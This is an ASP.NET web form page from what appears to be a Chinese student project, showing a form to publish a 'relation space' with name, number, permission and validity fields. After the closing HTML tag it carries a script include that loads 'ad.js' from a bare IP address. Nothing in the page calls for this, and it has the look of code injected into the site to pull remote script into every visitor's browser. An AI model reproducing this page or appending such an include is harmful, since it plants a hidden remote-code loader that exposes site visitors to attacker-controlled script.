<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rmodelpublish.aspx.vb" Inherits="relation.WebForm1"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>WebForm1</title>
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
		<style type="text/css"> .style1 { FONT-SIZE: large } .style2 { FONT-SIZE: medium } </style>
	</HEAD>
	<body>
		<TABLE id="Table1" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
			border="0" valign="middle">
			<TR>
				<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
					<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
				</TD>
			</TR>
			<TR bgColor="#ffffff">
				<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
			</TR>
			<TR>
				<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
			</TR>
		</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
		<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
			<TR>
				<TD class="p9" vAlign="middle" width="190" bgColor="#dedede" height="18" style="WIDTH: 190px">
					<DIV align="center"><FONT color="#666666"><B>
								<asp:Label id="timetext" runat="server"></asp:Label>
								&nbsp; </B></FONT>
					</DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
					<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
					height="18">
					<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
									href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
									href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
									href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<DIV id="Div2" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
		<FONT face="宋体"></FONT>
		<TABLE id="Table3" height="62" cellSpacing="0" width="778" align="center">
			<TR border="0">
				<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
					<FONT color="#000000">&nbsp;|<SPAN class="p9"> <a href="index.aspx">首页</a></SPAN> |</FONT>
					<FONT color="#000000"><SPAN class="p9"><a href="index.aspx">用户登录</a></SPAN> |<a href="newcustomer.aspx">注册</a>
					</FONT>
				</TD>
			</TR>
			<TR border="0">
				<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
					<asp:Label id="lblHint" runat="server" ForeColor="Info">Label</asp:Label></TD>
				<TD vAlign="top" bgColor="#0859ad" height="20">
					<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">欢迎您 
								&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
						</FONT>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<CENTER>
			<TABLE id="Table4" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
				border="0">
				<TR>
					<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
						<TABLE id="Table5" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#0859ad">
									<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
								</TD>
							</TR>
						</TABLE>
						<TABLE id="Table6" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#9cd7ef">
									<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
										<TABLE id="Table7" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
											<TR>
												<TD width="147" height="45">
													<DIV align="center">&nbsp;&nbsp;<a href="rmodelpublish.aspx">发布关系空间</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="43">
													<DIV align="center"><a href="rdefinitionpublish.aspx">发布关系类型</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="55">
													<DIV align="center"><a href="rinstancepublish.aspx">发布关系实例</a></DIV>
												</TD>
											</TR>
										</TABLE>
										<BR>
										<BR>
									</DIV>
								</TD>
							</TR>
						</TABLE>
					</TD>
					<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
					<TD vAlign="top" width="611">
						<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
							&nbsp;&nbsp;
							<TABLE id="Table9" style="WIDTH: 574px; HEIGHT: 358px" cellSpacing="1" cellPadding="1"
								width="574" border="1">
								<TR>
									<TD><FONT face="宋体">
											<TABLE id="Table10" style="WIDTH: 562px; HEIGHT: 322px" cellSpacing="1" cellPadding="1"
												width="562" border="1">
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 33px">
														<asp:Label id="lblModelKey" runat="server">关系空间编号</asp:Label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 45px">
														<asp:TextBox id="txtModelKey" runat="server"></asp:TextBox>
														<asp:regularexpressionvalidator id="txtModelKeyRegularExpressionValidator" runat="server" Width="240px" Height="14px"
															ControlToValidate="txtModelKey" ValidationExpression="[0-9]{1,}" ErrorMessage="！输入关系空间编号必须为数字"></asp:regularexpressionvalidator></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 30px">
														<asp:Label id="lblModelName" runat="server">关系空间名称</asp:Label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 29px">
														<asp:TextBox id="txtModelName" runat="server"></asp:TextBox></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px">
														<asp:Label id="lblAccPri" runat="server">关系空间的权限</asp:Label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px">&nbsp;
														<asp:RadioButton id="rbtnAccPri1" runat="server" Text="权限1" GroupName="rbtnAccPri"></asp:RadioButton>&nbsp;
														<asp:RadioButton id="rbtnAccPri2" runat="server" Text="权限2" GroupName="rbtnAccPri"></asp:RadioButton>&nbsp;
														<asp:RadioButton id="rbtnAccPri3" runat="server" Text="权限3" GroupName="rbtnAccPri"></asp:RadioButton></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px">
														<asp:Label id="lblIsValid" runat="server">关系空间有效性</asp:Label></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px">&nbsp;&nbsp;
														<asp:RadioButton id="rbtnIsValidYes" runat="server" Text="有效" GroupName="rbtnIsValid"></asp:RadioButton>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
														<asp:RadioButton id="rbtnIsValidNo" runat="server" Text="无效" GroupName="rbtnIsValid"></asp:RadioButton></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px">
														<TABLE id="Table11" style="WIDTH: 546px; HEIGHT: 14px" cellSpacing="1" cellPadding="1"
															width="546" border="1">
															<TR>
																<TD style="WIDTH: 85px"></TD>
																<TD style="WIDTH: 52px">
																	<asp:Button id="btnPub" runat="server" Text="发布"></asp:Button></TD>
																<TD style="WIDTH: 35px"></TD>
																<TD style="WIDTH: 87px">
																	<asp:Button id="btnCancel" runat="server" Text="撤消"></asp:Button></TD>
																<TD>
																	<asp:Button id="btnPubRelType" runat="server" Text="发布关系类型"></asp:Button></TD>
															</TR>
														</TABLE>
														<asp:label id="lblWarning" ForeColor="#0000C0" runat="server" Width="542px">label</asp:label>
													</TD>
												</TR>
											</TABLE>
										</FONT>
									</TD>
								</TR>
							</TABLE>
						</FORM>
					</TD>
				</TR>
			</TABLE>
		</CENTER> <!---====================include pagetail================-->
		<CENTER>
			<TABLE id="Table8" cellSpacing="0" cellPadding="0" width="778" border="0">
				<TR>
					<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
				</TR>
				<TR>
					<TD class="p9" background="imga/bg5.gif">
						<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial"><STRONG>0571-<FONT face="Arial">63740939</FONT></STRONG></FONT></STRONG></DIV>
					</TD>
				</TR>
				<TR>
					<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
							版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
					</TD>
				</TR>
			</TABLE>
		</CENTER>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
